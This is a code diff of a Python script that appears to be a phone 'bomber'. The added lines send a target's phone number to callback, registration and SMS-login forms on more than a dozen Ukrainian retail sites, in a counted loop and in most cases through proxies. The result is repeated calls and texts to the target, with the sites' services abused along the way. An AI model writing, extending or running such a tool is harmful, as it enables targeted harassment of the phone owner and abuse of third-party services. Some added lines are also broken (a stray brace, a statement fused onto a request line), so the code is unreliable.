@@ -232,7 +232,20 @@ def send_for_number_https(aa):
     "uaId": "UA-53329668-1",
     "clientId": "428965036.1663000448",
     "pageUrl": "https://pancer.com.ua/ua/travmaticheskie-pistolety"})
-        d = requests.post('https://safari.dp.ua/ua/feedback/callback',headers=headers, data={'firstname': name,'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'callbackForm','isAjax': 1})
+        d = requests.post('https://safari.dp.ua/ua/feedback/callback',headers=headers,proxies=proxies, data={'firstname': name,'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'callbackForm','isAjax': 1})
+        d = requests.post('https://pcshop.ua/index.php?route=account/register/validateFirstStep',headers=headers,proxies=proxies,data={'lastname': name,'firstname': surname,'email': email,'telephone': aa,'password': '','fax':  '','address_1':  '','city':  '','country_id':''  ,'zone_id':  '','newsletter': 1})
+        d = requests.post('https://vest.in.ua/index.php?route=extension/module/oct_popup_call_phone/send',headers=headers,proxies=proxies,data={'referer': 'https://vest.in.ua/ua/tehnika-i-elektronika/category-compyuterna-pereferiya/categoria-klaviatura/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDBmbIgBvL5q4ku4tRhYzu3o9povZONfxRVsiTVmBjnZKTad1TT95zhoC-pQQAvD_BwE','telephone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://elmir.ua/response/load_json.php',headers=headers,proxies=proxies,data={'cb_phone': f'{aa[2:5]}-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}','day': 'd255','hour': 'h9','minute': 'm0','later': 1,'url': 'https://elmir.ua/keyboard/','type': 'callback','state': 'call'})
+        d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,proxies=proxies,json={"name": name,"phone": f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.get(f'https://touch.com.ua/ajax.php?act=getCallback&phone={aa}',proxies=proxies)
+        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call-postponed?timestamp=1663019019605&utcOffset=-180',headers=headers,data={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","timestamp": 1663048800000,"uaId": "UA-72798113-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/elf-bar"})
+        d = requests.post('https://www.mandrivnik.com.ua/ajax/callMe.php',headers=headers,proxies=proxies,data={'un': name,'uph': number_plus})
+        d = requests.post('https://steko.phonet.com.ua/rest/public/widget/call-catchers/a9ed83ce-75fe-4f52-bada-8a0fe7247f0a/call-postponed?timestamp=1663020130539&utcOffset=-180',headers=headers,json={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "cpc","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "3619279d-10b7-478e-a098-e71656bbf774","timestamp": 1663048800000,"uaId": "UA-45617472-4","clientId": "1754693290.1663020106","pageUrl": "https://online.steko.com.ua/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDGM6GLpYdA28DzU6e5R-dGncNeEJJWgd0NurEpl4yTB-yVxqp8apKBoCTr0QAvD_BwE"})
+        d = requests.post('https://denika.ua/index.php?route=extension/callback/callback_phone/send',headers=headers,proxies=proxies,data={'data[name]': name,'data[phone]': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://agat-m.com.ua/send.php',headers=headers,proxies=proxies,data={'name': name,'phone': number_plus})
+        d = requests.get(f'https://bond.od.ua/newclient///?phone=+{aa}',headers=headers,proxies=proxies)
+        d = requests.post('https://megasport.ua/api/feedback/sendCallback/?language=ua',headers=headers,proxies=proxies,json={"phone": number_plus})
+        d = requests.post('https://megasport.ua/api/auth/phone/?language=ua',headers=headers,proxies=proxies,json={'phone': number_plus})
         coun+=1
         print(f'Круг {coun}')
     except:
@@ -377,7 +390,19 @@ def send_for_number(aa):
     "clientId": "428965036.1663000448",
     "pageUrl": "https://pancer.com.ua/ua/travmaticheskie-pistolety"})
         d = requests.post('https://safari.dp.ua/ua/feedback/callback',headers=headers, data={'firstname': name,'cellphone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]} {aa[8:10]} {aa[10:12]}','isAjaxForm': 'callbackForm','isAjax': 1})
-        coun+=1
+        d = requests.post('https://pcshop.ua/index.php?route=account/register/validateFirstStep',headers=headers,data={'lastname': name,'firstname': surname,'email': email,'telephone': aa,'password': '','fax':  '','address_1':  '','city':  '','country_id':''  ,'zone_id':  '','newsletter': 1})
+        d = requests.post('https://vest.in.ua/index.php?route=extension/module/oct_popup_call_phone/send',headers=headers,data={'referer': 'https://vest.in.ua/ua/tehnika-i-elektronika/category-compyuterna-pereferiya/categoria-klaviatura/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDBmbIgBvL5q4ku4tRhYzu3o9povZONfxRVsiTVmBjnZKTad1TT95zhoC-pQQAvD_BwE','telephone': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://elmir.ua/response/load_json.php',headers=headers,data={'cb_phone': f'{aa[2:5]}-{aa[5:8]}-{aa[8:10]}-{aa[10:12]}','day': 'd255','hour': 'h9','minute': 'm0','later': 1,'url': 'https://elmir.ua/keyboard/','type': 'callback','state': 'call'})
+        d = requests.post('https://kvshop.com.ua/callrequest',headers=headers,json={"name": name,"phone": f'+{aa[:2]}({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.get(f'https://touch.com.ua/ajax.php?act=getCallback&phone={aa}')
+        d = requests.post('https://anixgroup.pbx.vega.ua/rest/public/widget/call-catchers/24af7d3e-9a1e-4a50-b02c-65b1868dc0fb/call-postponed?timestamp=1663019019605&utcOffset=-180',headers=headers,data={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "organic","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "c8f6cdf7-526a-43d7-a95b-8266650ec620","timestamp": 1663048800000,"uaId": "UA-72798113-9","clientId": "286334084.1662909385","pageUrl": "https://anix.ua/ua/elf-bar"})
+        d = requests.post('https://www.mandrivnik.com.ua/ajax/callMe.php',headers=headers,data={'un': name,'uph': number_plus})
+        d = requests.post('https://steko.phonet.com.ua/rest/public/widget/call-catchers/a9ed83ce-75fe-4f52-bada-8a0fe7247f0a/call-postponed?timestamp=1663020130539&utcOffset=-180',headers=headers,json={"phone": number_plus,"date": "13-Сентября-2022","time": "09:00","utm": {"source": "google","medium": "cpc","campaign": "(not set)","content": "(not set)","term": "(not set)"},"referrer": "https://www.google.com.ua/","telerSessionId": "3619279d-10b7-478e-a098-e71656bbf774","timestamp": 1663048800000,"uaId": "UA-45617472-4","clientId": "1754693290.1663020106","pageUrl": "https://online.steko.com.ua/?gclid=CjwKCAjwsfuYBhAZEiwA5a6CDGM6GLpYdA28DzU6e5R-dGncNeEJJWgd0NurEpl4yTB-yVxqp8apKBoCTr0QAvD_BwE"})
+        d = requests.post('https://denika.ua/index.php?route=extension/callback/callback_phone/send',headers=headers,data={'data[name]': name,'data[phone]': f'+{aa[:2]} ({aa[2:5]}) {aa[5:8]}-{aa[8:10]}-{aa[10:12]}'})
+        d = requests.post('https://agat-m.com.ua/send.php',headers=headers,data={'name': name,'phone': number_plus})
+        d = requests.get(f'https://bond.od.ua/newclient///?phone=+{aa}}',headers=headers)
+        d = requests.post('https://megasport.ua/api/feedback/sendCallback/?language=ua',headers=headers,json={"phone": number_plus})
+        d = requests.post('https://megasport.ua/api/auth/phone/?language=ua',headers=headers,json={'phone': number_plus})        coun+=1
         print(f'Круг {coun}')
     except:
         print(d.text)
